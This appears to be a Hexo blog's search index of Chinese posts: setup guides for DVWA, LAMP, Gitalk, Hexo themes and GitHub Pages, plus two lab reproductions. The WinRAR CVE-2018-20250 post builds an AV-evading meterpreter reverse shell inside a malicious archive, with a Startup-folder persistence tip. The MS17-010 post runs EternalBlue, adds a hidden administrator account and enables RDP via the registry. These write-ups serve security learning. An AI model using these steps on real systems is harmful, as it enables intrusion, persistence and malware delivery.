<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DVWA-master渗透测试平台搭建]]></title>
    <url>%2Finstall-DVWA-master%2F</url>
    <content type="text"><![CDATA[关于DVWA 在Windows系统中搭建DVWA 在Linux系统中搭建DVWA 其他 一. 关于DVWADVWA(Damn Vulnerable Web Application)是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 DVWA的目标是通过简单直接的界面练习一些最常见的Web漏洞，具有各种难度。请注意，此软件存在记录和未记录的漏洞。 DVWA共有十个模块，分别是: Brute Force（暴力（破解） Command Injection（命令行注入） CSRF（跨站请求伪造） File Inclusion（文件包含） File Upload（文件上传） Insecure CAPTCHA （不安全的验证码） SQL Injection（SQL注入） SQL Injection（Blind）（SQL盲注） XSS（Reflected）（反射型跨站脚本） XSS（Stored）（存储型跨站脚本） 同时每个模块的代码都有4种安全等级：Low、Medium、High、Impossible。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理。 二. 在Windows系统中搭建DVWA1.下载DVWA从https://github.com/ethicalhack3r/DVWA下载zip包或使用git命令直接下载 2. 将DVWA放入本地站点目录中本人的Windows系统中使用phpstudy搭建web服务器 将解压出来的文件放入phpStudy\PHPTutorial\WWW目录下 3. 安装DVWA3.1 修改配置文件打开\DVWA-master\config目录下的config.inc.php文件 修改以下字段 12345$_DVWA = array();$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'root用户密码'; 3.2 安装DVWA打开浏览器，输入http://127.0.0.1/DVWA-master/index.php进入，选择左侧的Setup/Reset DB选项，在最下方点击Create/Reset Database，如果提示Setup successful!即安装成功 3.3 登录DVWA使用浏览器访问http://127.0.0.1/DVWA-master/，输入用户名admin，密码password即可登录 三. 在Linux系统中搭建DVWA在Linux系统中搭建DVWA的过程和Windows系统中基本一致 1.下载DVWA12root@ubuntu:~# cd /var/www/htmlroot@ubuntu:/var/www/html# git clone https://github.com/ethicalhack3r/DVWA 2.修改配置文件123root@ubuntu:/var/www/html# cd DVWA/config/root@ubuntu:/var/www/html/DVWA/config# mv config.inc.php.dist config.inc.phproot@ubuntu:/var/www/html/DVWA/config# vi config.inc.php 修改config.inc.php文件的内容，同Windows系统 3. 安装DVWA在浏览器内输入127.0.0.1/DVWA，进入DVWA安装页面，拉到最下面，点击Create/Reset Database，如果提示Setup successful!即完成安装 此时会跳转到登录页面，输入账号密码即可登录 四. 其他以上便是DVWA在两种操作系统上部署的全过程，仅供参考和学习]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04安装lamp环境]]></title>
    <url>%2Fubuntu16-04-lamp%2F</url>
    <content type="text"><![CDATA[什么是lamp环境 Ubuntu16.04安装lamp环境 其他 一. 什么是lamp环境LAMP是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写： Linux，操作系统 Apache，网页服务器 MariaDB或MySQL，数据库管理系统（或者数据库服务器） PHP、Perl或Python，脚本语言 二. Ubuntu16.04安装lamp环境1. 添加软件源1.1 查找国内镜像源本文使用清华大学开源软件镜像站所提供的Ubuntu镜像源 12345678910111213# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse 1.2 配置source listsources.list系统自带的，源是来Ubuntu的官网！安装包比较慢，所以最好切换成国内的 123root@ubuntu:~$ cd /etc/aptroot@ubuntu:/etc/apt$ sudo cp sources.list sources.list.bakroot@ubuntu:/etc/apt$ vim sources.list 将国内镜像源的内容复制进去 1.4 更新源1root@ubuntu:/etc/apt$ sudo apt-get update 1.5 其他命令12345678910111213141516sudo apt-get update 更新源sudo apt-get install package 安装包sudo apt-get remove package 删除包sudo apt-cache search package 搜索软件包sudo apt-cache show package 获取包的相关信息，如说明、大小、版本等sudo apt-get install package --reinstall 重新安装包sudo apt-get -f install 修复安装sudo apt-get remove package --purge 删除包，包括配置文件等sudo apt-get build-dep package 安装相关的编译环境sudo apt-get upgrade 更新已安装的包sudo apt-get dist-upgrade 升级系统sudo apt-cache depends package 了解使用该包依赖那些包sudo apt-cache rdepends package 查看该包被哪些包依赖sudo apt-get source package 下载该包的源代码sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包sudo apt-get check 检查是否有损坏的依赖 2. 安装Apache2 web 服务器1sudo apt install apache2 -y 检查是否开启Apache 1systemctl status apache2 开启、关闭和重启服务器 123/etc/init.d/apache2 start/etc/init.d/apache2 stop/etc/init.d/apache2 restart 访问你的 web 服务器，打开浏览器并输入服务器的IP地址或者主机名 3. 安装MySQL数据库1sudo apt install mysql-server mysql-client 在安装过程中会要求设置root用户密码 确认安装成功 1sudo netstat -ano | grep 3306 4. 安装PHP脚本语音1sudo apt install php7.0-mysql php7.0-curl php7.0-json php7.0-cgi php7.0 libapache2-mod-php7.0 查看PHP版本 1php --version 查看phpinfo 1vi /var/www/html/phpinfo.php 在phpinfo.php文件内写入如下内容 123&lt;?php echo phpinfo();?&gt; 从浏览器中访问这个页面, 输入http://127.0.0.1/phpinfo.php，可以看到如下页面。 5. 安装phpmyadmin123sudo apt install php-mbstring php7.0-mbstring php-gettextsudo systemctl restart apache2.servicesudo apt install phpmyadmin 安装完成后，在浏览器中访问http://127.0.0.1/phpmyadmin，即可进入phpmyadmin 如果在浏览器中无法打开phpmyadmin，需要将/usr/share/phpmyadmin/链接到/var/www/html/目录下 1ln -s /usr/share/phpmyadmin/ /var/www/html/ 三. 其他以上便是Ubuntu16.04安装lamp环境的全过程，本地的网络服务器已经搭建成功]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>ubuntu</tag>
        <tag>lamp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用gittalk实现hexo博客评论功能]]></title>
    <url>%2Fgitalk%2F</url>
    <content type="text"><![CDATA[关于gitalk 使用gitalk实现hexo博客评论功能 其他 关于gitalkGitalk 是一个基于 GitHub Issue 和 Preact 开发的评论插件。 特性 使用GitHub登录 支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru] 支持个人或组织 无干扰模式（设置 distractionFreeMode 为 true 开启） 快捷键提交评论 （cmd|ctrl + enter） gitalk实现hexo博客评论功能Register Application在GitHub上注册新应用，链接：https://github.com/settings/applications/new 参数说明： Application name： # 应用名称，随意 Homepage URL： # 网站URL Application description # 描述，随意 Authorization callback URL：# 网站URL 点击注册后，页面跳转如下，其中Client ID和Client Secret在后面的配置中需要用到，到时复制粘贴即可： 新建gitalk.swig在主题文件夹下新建/layout/_third-party/comments/gitalk.swig文件，并添加内容： 1234567891011121314151617&#123;% if page.comments &amp;&amp; theme.gitalk.enable %&#125; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt; &lt;script src=&quot;https://unpkg.com/gitalk/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt; var gitalk = new Gitalk(&#123; clientID: &apos;&#123;&#123; theme.gitalk.ClientID &#125;&#125;&apos;, clientSecret: &apos;&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;&apos;, repo: &apos;&#123;&#123; theme.gitalk.repo &#125;&#125;&apos;, owner: &apos;&#123;&#123; theme.gitalk.githubID &#125;&#125;&apos;, admin: [&apos;&#123;&#123; theme.gitalk.adminUser &#125;&#125;&apos;], id: location.pathname, distractionFreeMode: &apos;&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;&apos; &#125;) gitalk.render(&apos;gitalk-container&apos;) &lt;/script&gt;&#123;% endif %&#125; 修改comments.swig修改主题文件夹内/layout/_partials/comments.swig，添加内容如下，与前面的elseif同一级别上： 12&#123;% elseif theme.gitalk.enable %&#125; &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt; 修改index.swig修改layout/_third-party/comments/index.swig，在最后一行添加内容： 1&#123;% include &apos;gitalk.swig&apos; %&#125; 新建gitalk.styl新建/source/css/_common/components/third-party/gitalk.styl文件，添加内容： 1234.gt-header a, .gt-comments a, .gt-popup a border-bottom: none;.gt-container .gt-popup .gt-action.is--active:before top: 0.7em; 修改third-party.styl修改/source/css/_common/components/third-party/third-party.styl，在最后一行上添加内容，引入样式： 1@import &quot;gitalk&quot;; 修改_config.yml在主题配置文件next/_config.yml中添加如下内容： 12345678gitalk: enable: true githubID: github帐号 repo: 仓库名称 ClientID: Client ID ClientSecret: Client Secret adminUser: github帐号 #指定可初始化评论账户 distractionFreeMode: true 其他以上就是NexT中添加gitalk评论的配置，博客上传到GitHub上后，打开页面进入某一博客内容下，就可看到评论处。 参考文章 https://asdfv1929.github.io/2018/01/20/gitalk/ https://liujunzhou.top/2018/8/10/gitalk-error/]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-20250（WinRAR目录穿越漏洞）复现]]></title>
    <url>%2Fwinrar-CVE-2018-20250%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2月下旬，著名压缩软件WinRAR被曝高危漏洞，全球已有超过5亿用户受到影响。该漏洞一旦被黑客利用，黑客就能将恶意程序植入使用者电脑的开机程序中，该漏洞在2005年便已经存在。 本文在虚拟环境中，使用Metasploit对漏洞攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，没有任何的基础保护机制(ASLR, DEP 等)。该动态链接库的作用是处理 ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。 2.漏洞影响 WinRAR &lt; 5.70 Beta 1 Bandizip &lt; = 6.2.0.0 好压(2345压缩) &lt; = 5.9.8.10907 360压缩 &lt; = 4.0.0.1170 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Metasploit5生成免杀Payload在kali Linux中输入msfconsole命令启动Metasploit 在Metasploit中依次输入 1234use evasion/windows/windows_defender_exeshow infoset filename WinRAR.exeset payload windows/meterpreter/reverse_tcp 输入show options查看配置 使用如下命令修改配置 12set lhost 192.168.28.136set lport 12345 修改完成后输入run运行，提示生成如下文件 2.使用exp生成恶意文件exp下载：https://github.com/WyAtu/CVE-2018-20250/ 2.1修改exp.py文件将exp.py中的evil_filename“的值改为&quot;WinRAR.exe&quot;，将target_filename的值改为&quot;.\hi.exe&quot; 2.2生成恶意文件将刚才使用Metasploit生成的WinRAR.exe文件复制到下载的exp文件夹内，使用python exp.py命令生成恶意程序test.rar 值得注意的是，执行此命令需要python3以上的环境，另外如果在Linux系统中执行不成功可以尝试使用Windows系统来执行 3.在kali Linux中使用Metasploit监听靶机在Linux终端中运行如下命令 1234567msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow optionsset lhost 192.168.28.128set lport 12345run 4.在靶机上运行恶意程序将test.rar文件放入靶机，解压该文件，解压后会生成如下文件 双击执行hi.exe文件，此时kali Linux中会收到会话，即可获得靶机权限 四.后记以上便是使用CVE-2018-20250漏洞对靶机进行攻击的整个复现过程，我们看到病毒可以通过恶意压缩包进行传播，在本次复现中，我们将病毒文件直接解压在压缩文件解压的目标文件夹中并手动运行的，其实我们是可以通过修改exp.py文件中target_filename的值来修改病毒文件解压出来的位置，例如对win7系统的靶机，我们可以将值修改为r&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;，这样病毒文件就会在下次开机是自动启动，悄无声息的完成对电脑的攻击。 大家可以留意一下自己电脑中压缩软件的版本，选择最新版本的软件即可防止此类攻击，同时也要养成好的习惯，不随意下载和使用不明来源的压缩文件]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>漏洞复现</tag>
        <tag>CVE-2018-20250</tag>
        <tag>WinRAR目录穿越漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ms17-010（永恒之蓝）漏洞复现]]></title>
    <url>%2Fms17-010%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言 复现准备 复现过程 后记 一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。 二.复现准备1.漏洞描述Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 2.漏洞影响目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。 3.复现环境虚拟环境搭建：VMware Workstation 15 pro 网络模式：NAT 攻击机：kali Linux 2019.1 IP:192.168.28.136 靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128 三.复现过程1.使用Nmap对靶机进行扫描1.1.在本地查找ms17-010漏洞 1.2.使用nmap对靶机进行扫描使用命令并执行 1root@kali:/usr/share/nmap/scripts# nmap --script smb-vuln-ms17-010 192.168.28.128 2.使用Metasploit对目标进行监听输入msfconsole启动Metasploit在Metasploit中，输入search ms17-010查找永恒之蓝漏洞 输入use exploit/windows/smb/ms17_010_eternalblue执行漏洞输入show options查看当前攻击配置 将配置中第一行的RHOST修改为靶机IP地址1set rhost 192.168.28.128 再次查看配置 配置完成后，使用run命令执行程序，如果执行成功，会进入windows系统的命令行 在命令行中输入whoami查看当前登录用户 3.在靶机创建用户并赋予管理员权限12net user username password /addnet localgroup administrators username /add 4.开启3389端口并使用远程桌面登录在命令行中输入REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f并执行，即可打开3389端口此时我们新建一个终端，输入rdesktop 192.168.28.128登录远程桌面 此时我们选择其他用户并使用刚才创建的用户登录，稍等便能登录到Windows桌面了 四.后记以上便是使用ms17-010永恒之蓝漏洞对靶机进行攻击的整个复现过程，由此可见攻击过程并不复杂，只需要简单的步骤即可完成攻击并获得极高的权限。由此我们也可以看到平常在使用计算机的时候要注重安全防护。 此漏洞应该在系统的自动更新或各电脑管家的更新中会提示修复的，大家可以查看一下自己的系统有没有安装，没有的话一定要安装]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
        <tag>Metasploit</tag>
        <tag>ms17-010</tag>
        <tag>永恒之蓝</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在hexo中添加主题和live2d看板娘]]></title>
    <url>%2Fnext_live2d%2F</url>
    <content type="text"><![CDATA[使用hexo主题 在博客中添加live2d看板娘 一.使用hexo主题hexo拥有大量的主题文件，我们可以通过官方的主题页面来查找自己想要的主题，同时官方还有创建主题的文档可以参考。 选择你想要使用的主题，本文用next主题来演示。 1.下载主题进入hexo站点目录下，使用git输入1$ git clone https://github.com/iissnan/hexo-theme-next themes/next 2.启用主题在下完完成后，打开站点配置文件_config.yml，找到theme字段，并将值改为你所使用的主题名。 随后使用hexo clean清除hexo缓存。 3.验证主题启动hexo本地站点 1hexo s -d 访问本地站点，看到主题改变了，就表示安装成功了。 4.自定义主题主题安装完成后，进入theme文件夹下的主题文件夹内，修改_config.yml配置文件，配置文件的具体内容可以参考主题的相关文档。 二.添加live2d看板娘1.安装打开hexo目录，使用git bash输入 1npm install --save hexo-helper-live2d 2.开启进入网站配置文件内，添加如下内容 12345678910111213141516live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false log: false model: use: live2d-widget-model-z16 display: position: right width: 150 height: 300 mobile: show: false 保存后重新生成网站即可看到。 3.添加模型打开hexo目录，使用git bash输入 1npm install 模型的包名 然后将包名输入位于 _config.yml 的 model.use 中。 三.参考资料next主题 live2d]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>美化</tag>
        <tag>live2d</tag>
        <tag>Next</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用GitHub+hexo搭建个人博客]]></title>
    <url>%2Fmy-first-blog%2F</url>
    <content type="text"><![CDATA[随笔 博客搭建过程 其他的一些东西 一.随笔从3月开始学习网络安全相关的知识，但愿有朝一日能够步入网络安全的门，进入这个行业 学习第二周，第一次搭建博客，第一次写markdown，希望能够坚持下去，记录一些学到的东西 二.使用GitHub搭建个人博客1.准备工作 需要的软件 node.js(http://nodejs.cn/) git(https://git-scm.com/) hexo(https://hexo.io/zh-cn/) 2.创建仓库新建一个名为你的用户名.github.io的仓库，生成后的访问地址是 https://你的用户名.github.io ,貌似必须是自己的用户名，否则无法访问，不过我自己并没有试过。 如果自己有域名的话可以绑定自己的域名，不过不绑定也没有什么关系。 3.配置SSH key使用ssh key来进行本地和服务器间的链接 1$ cd ~/. ssh #检查是否存在ssh密钥 如果提示：No such file or directory 说明你是第一次使用git。 1$ ssh-keygen -t rsa -C "邮箱地址" 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key： 保存之后测试一下是否成功 1$ ssh -T git@github.com #这里的邮箱地址不用修改 如果看到提示Are you sure you want to continue connecting (yes/no)? ，输入yes，然后就会看到 Hi CJJKKK! You’ve successfully authenticated, but GitHub does not provide shell access. 说明配置已经成功了，接下来继续配置用户名和邮箱 12$ git config --global user.name "用户名" #你的用户名$ git config --global user.email "邮箱" #你的注册邮箱 4.安装hexo4.1关于hexoHexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。 4.2安装 (1)尽量使用git bash来完成 (2)hexo不同版本有较大差别，看教程的时候要注意 (3)hexo有两种配置文件_config.yml文件，一个是根目录下的，一个是各个theme下的 安装hexo 1$ npm install -g hexo 5.初始化在电脑上新建一个文件夹专门用来存放代码，然后使用git bash进入该文件夹 1$ hexo init hexo会自动下载一些文件到这个目录 12$ hexo g #生成$ hexo s #启动 执行这些命令后，hexo就会在public文件夹生成相关html文件，这些文件将来都是要提交到github去的 hexo s是开启本地预览服务，打开浏览器访问 http://localhost:4000 即可看到内容，如果打不开可能是端口被占用了，可以换个端口解决。记得本地预览完之后用ctrl+c关闭本地预览服务 hexo是支持修改主题的，具体如何修改可能下一篇文章会讲hhh 6.上传到GitHub完成了上面的操作后，就要上传到GitHub了 在配置完ssh key之后，要配置_config.yml中的有关deploy部分 1234deploy: type: git repository: git@github.com:用户名/用户名.github.io.git branch: master 接下来输入hexo d -g就会提交代码了 如果显示error deployer not found:github，可以使用如下命令来完成 1$ npm install --save hexo-deployer-git 还有一些关于保留CNAME、README.md等文件的东西，一些非md文件可以把他们放到source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的。由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。 7.常用hexo命令1234567$ hexo new "postName" #新建文章$ hexo new page "pageName" #新建页面$ hexo generate #生成静态页面至public目录$ hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）$ hexo deploy #部署到GitHub$ hexo help # 查看帮助$ hexo version #查看Hexo的版本 组合命令 12$ hexo s -g #生成并本地预览$ hexo d -g #生成并上传 8.如何写博客定位到代码目录里，执行命令 1$ hexo new 'my-first-blog' hexo会在_post下生成相关的md文件，这时候只要打开就可以写博客了 一般完整格式如下： 123456789---title: postName #文章页面上的显示名称，一般是中文date: 2013-12-02 15:30:16 #文章生成时间，一般不改，当然也可以任意修改categories: 默认分类 #分类tags: [tag1,tag2,tag3] #文章标签，可空，多标签请用格式，注意:后面有个空格description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面---以下是正文 关于写博客的工具，我用的是Typora，或者有其他的写markdown的工具也可以，反正我是刚开始用，用的也不好。 让博客不显示全文的方法 在合适的位置上加入&lt;!--more--&gt;即可。 三.还有些其他的到此位置使用GitHub搭建博客应该就完成了，这个时候可以去查看一下自己的博客是什么样子的了。 我本人实在是不大会写markdown，就先写这么多，可能最后有一些问题，比如目录显示不出来之类的，学会了继续改。 最后是一些参考资料。 参考博客 markdown教程 Hexo文档]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
        <tag>Hexo</tag>
        <tag>随笔</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
</search>
